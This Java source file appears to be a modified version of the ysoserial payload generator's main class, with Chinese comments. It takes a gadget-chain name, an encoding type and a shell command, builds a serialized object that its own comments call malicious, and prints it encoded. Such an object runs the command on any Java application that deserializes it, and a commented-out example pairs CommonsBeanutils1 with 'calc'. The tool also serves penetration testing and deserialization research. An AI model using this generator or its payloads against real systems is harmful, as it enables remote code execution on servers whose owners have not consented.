package ysoserial;

import java.io.PrintStream;
import java.util.*;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.encode.EncodeFactory;

@SuppressWarnings("rawtypes")
//入口主类
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	public static void main(String[] args){
//        args = new String[]{"CommonsBeanutils1","Bytes", "calc"};

        if (args.length != 3) {
			printUsage();
			System.exit(USAGE_CODE);
		}


		final String payloadType = args[0];
        final String encodeType = args[1];
		final String command = args[2];

        //加载payload对应的PayloadClass（实现ObjectPayload的类）
		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return; // make null analysis happy
		}

		try {
			final ObjectPayload payload = payloadClass.newInstance();
            //传入命令，返回等待被序列化的恶意对象
			final Object object = payload.getObject(command);
			PrintStream out = System.out;
            byte[] serialize = Serializer.serialize(object, out);
            EncodeFactory encodeFactory = null;
            if (encodeType != null) {
                Class<? extends EncodeFactory> encodeClass = EncodeFactory.Utils.getEncodeClass(encodeType);
                encodeFactory = encodeClass.newInstance();
            }
            System.out.println(encodeFactory.encode(serialize));
            ObjectPayload.Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[EncodeType]' '[command]'");
        System.err.println("  Available EncodeTypes:");

		System.err.println("  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        //按字母排序
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        //添加帮助文档
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        //解析表格，就是对String[]进行排版
        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
